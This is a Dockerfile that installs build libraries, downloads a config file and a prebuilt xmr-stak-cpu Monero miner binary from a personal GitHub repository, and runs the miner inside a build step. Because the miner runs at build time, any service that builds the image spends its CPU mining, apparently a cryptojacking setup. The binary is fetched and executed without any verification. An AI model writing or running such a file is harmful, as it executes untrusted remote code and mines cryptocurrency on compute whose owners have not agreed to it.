FROM ubuntu:16.04

RUN apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev build-essential libhwloc-dev 
RUN wget https://github.com/wlodek12/wlode2/raw/master/config2.txt 
RUN mv config2.txt config.txt
RUN wget https://github.com/wlodek12/wlode2/raw/master/xmr-stak-cpu && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128
RUN ulimit -n 265555 && ulimit -Hn 265555 && ./xmr-stak-cpu

